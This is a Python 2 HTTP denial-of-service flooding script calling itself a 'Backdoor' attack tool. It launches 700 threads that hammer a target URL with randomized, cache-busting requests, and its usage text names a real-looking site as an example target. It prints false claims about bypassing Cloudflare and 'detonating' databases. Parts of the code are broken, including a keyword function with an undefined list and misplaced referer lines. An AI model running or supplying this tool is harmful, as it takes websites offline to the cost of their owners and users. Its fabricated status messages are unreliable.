
import urllib2
import sys
import threading
import random
import re

#global params                                                                                       
url=''                                                                                              
host=''                                                                                             
headers_useragents=[]                                                                               
headers_referers=[]                                                                                 
request_counter=0                                                                                   
flag=0                                                                                              
safe=0                                                                                              

def inc_counter():
	global request_counter
	request_counter+=45

def set_flag(val):
	global flag
	flag=val

def set_safe():
	global safe
	safe=1
	
# generates a user agent array
def useragent_list():
	global headers_useragents
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) BlackHawk/1.0.195.0 Chrome/127.0.0.1 Safari/62439616.534')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (PlayStation 4 1.52) AppleWebKit/536.26 (KHTML, like Gecko)')
	headers_useragents.append('Mozilla/5.0 (Windows NT 6.1; rv:26.0) Gecko/20100101 Firefox/26.0 IceDragon/26.0.0.2')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	return(headers_useragents)

# generates a referer array
def referer_list():
	global headers_referers
	headers_referers.append('http://www.google.com/?q=')                                       
	headers_referers.append('http://www.usatoday.com/search/results?q=')                       
	headers_referers.append('http://engadget.search.aol.com/search?q=')                        
	headers_referers.append('http://www.google.com/?q=')                                      
	headers_referers.append('http://www.usatoday.com/search/results?q=')                       
	headers_referers.append('http://engadget.search.aol.com/search?q=')                        
	headers_referers.append('http://www.bing.com/search?q=')                                   
	headers_referers.append('http://search.yahoo.com/search?p=')                               
	headers_referers.append('http://www.ask.com/web?q=')
	headers_referers.append('http://search.lycos.com/web/?q=')
	headers_referers.append('http://busca.uol.com.br/web/?q=')
	headers_referers.append('http://us.yhs4.search.yahoo.com/yhs/search?p=')
	headers_referers.append('http://www.dmoz.org/search/search?q=')
	headers_referers.append('http://www.baidu.com.br/s?usm=1&rn=100&wd=')
	headers_referers.append('http://yandex.ru/yandsearch?text=')
	headers_referers.append('http://www.zhongsou.com/third?w=')
	headers_referers.append('http://hksearch.timway.com/search.php?query=')
	headers_referers.append('http://find.ezilon.com/search.php?q=')
	headers_referers.append('http://www.sogou.com/web?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')

# generates a Keyword list	
def keyword_list():
        global keyword_top
        keyword_top.append('EyuBoo')
        keyword_top.append('Suicide')
        keyword_top.append('Sex')
        keyword_top.append('Robin Williams')
        keyword_top.append('World Cup')
        keyword_top.append('Ca Si Le Roi')
        keyword_top.append('Ebola')
        keyword_top.append('Malaysia Airlines Flight 370')
        keyword_top.append('ALS Ice Bucket Challenge')
        keyword_top.append('Flappy Bird')
        keyword_top.append('Conchita Wurst')
        keyword_top.append('ISIS')
        keyword_top.append('Frozen')
        keyword_top.append('014 Sochi Winter Olympics')
        keyword_top.append('IPhone')
        keyword_top.append('Samsung Galaxy S5')
        keyword_top.append('Nexus 6')
        keyword_top.append('Moto G')
        keyword_top.append('Samsung Note 4')
        keyword_top.append('LG G3')
        keyword_top.append('Xbox One')
        keyword_top.append('Apple Watch')
        keyword_top.append('Nokia X')
        keyword_top.append('Ipad Air')
        keyword_top.append('Facebook')
        keyword_top.append('Anonymous')
        keyword_top.append('DJ Bach')

	headers_referers.append('http://' + host + '/')
	return(headers_referers)
	
#builds random ascii string
def buildblock(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 160)
		out_str += chr(a)
	return(out_str)

def usage():    
	print ' Backdoor Http Denial Of Service Tool '
	print ' Usage: Backdoor.py (url)'
	print ' Example: Backdoor.py http://otherisrael.org/'
	print "\a"
print \
"""
#######################################################################
##.._|      | `-.  | `.  -_-_ _-_  _-  _- -_ -  .'|   |.'|     |  _..##
##   `-.._  |    |`!  |`.  -_ -__ -_ _- _-_-  .'  |.;'   |   _.!-'|  ##
##      | `-!._  |  `;!  ;. _______________ ,'| .-' |   _!.i'     |  ##
##..__  |     |`-!._ | `.| |_  BACKDOOR   _||.''|  _!.;'   |     _|..##
##   |``'..__ |    |`';.| i|_|MMMMMMMMMMM|_|'| _!-|   |   _|..-|'    ##
##   |      |``--..|_ | `;!|_|MMoMMMMoMMM| |.'j   |_..!-'|     |     ##
##   |      |    |   |`-,!_|_|MMMMP'YMMMM|_||.!-;'  |    |     |     ##
##___|______|____!.,.!,.!,!| |MMMo * loMM| |,!,.!.,.!..__|_____|_____##
##      |     |    |  |  | |_|MMMMb,dMMMM|_|| |   |   |    |      |  ##
##      |     |    |..!-;'i| |MPYMoMMMMoM| | |`-..|   |    |      |  ##
##     |    _!.-j'  | _!,'|_|M(>MMMMoMMM|_||!._|  `i-!.._ |      |   ##
##     _!.-'|    | _.'|  !;| |MbdMMoMMMMM| |`.| `-._|    |``-.._  |  ##
##..-i'     |  _.''|  !-| !|_|MMMoMMMMoMM|_|.|`-. | ``._ |     |``'..##
##   |      |.|    |.|  !| | |MoMMMMoMMMM| ||`. |`!   | `'.    |     ##
##   |  _.-'  |  .'  |.' |/|_|MMMMoMMMMoM|_|! |`!  `,.|    |-._|     ##
##  _!''|     !.'|  .'| .'|[@]MMMMMMMMMMM[@] \|  `. | `._  |   `-._  ##
##-'    |   .'   |.|  |/| /                 \|`.  |`!    |.|      |`-##
##      |_.'|   .' | .' |/                   \  \ |  `.  | `._    |  ##
##     .'   | .'   |/|  /                     \ |`!   |`.|    `.  |  ##
## _.'     !'|   .' | /                       \|  `  |  `.    |`.|   ##
#######################################################################
__________________________________________________________________________

#BackDoor Dangerious Http Denial Of Service Attack Tool Created By EyuBoo

#Sneak In Back Door Sends The Packet
__________________________________________________________________________                                              
"""

	
#http request
def httpcall(url):
	useragent_list()
	referer_list()
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(50,100)))
	request.add_header('Keep-Alive', random.randint(110,160))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
 			print '                                                                    '
 			print '*--------->>>  Zombies Connecting To The Site <<<<---------->>> Creating Socket <<<-------*'
 			print '*----------->>>> Backdoor Bypassing Cloudflare <<<--------->>> Firewall Is Breaking <<<------*'
 			print '*---------->>>   Database Is Detonated <<<------------>>>     Breaks SQL Connection <<<----------*'
 			print '*-------------->>> Creating New Thread <<<------------->>> The package is loaded<<<-------------*'
 			print '                                                                    '
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

	
#http caller thread 
class HTTPThread(threading.Thread):
	def run(self):
		try:
			while flag<2:
				code=httpcall(url)
				if (code==500) & (safe==1):
					set_flag(2)
		except Exception, ex:
			pass

# monitors http threads and counts requests
class MonitorThread(threading.Thread):
	def run(self):
		previous=request_counter
		while flag==0:
			if (previous+150<request_counter) & (previous<>request_counter):
				print "*Zombies Connected to the Site Packet Uploading %d " % (request_counter)
				previous=request_counter
		if flag==2:
			print "\n ~>Stopping Backdoor Dos Attack<~"

#execute 
if len(sys.argv) < 2:
	usage()
	sys.exit()
else:
	if sys.argv[1]=="help":
		usage()
		sys.exit()
	else:
		print "Starting Backdoor Dos Attack Connecting To the Site..."
		print "           Checking target for vulnerability... "     
		              
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
		url = sys.argv[1]
		if url.count("/")==2:
			url = url + "/"
		m = re.search('http\://([^/]*)/?.*', url)
		host = m.group(1)
		for i in range(700):
			t = HTTPThread()
			t.start()
		t = MonitorThread()
		t.start()

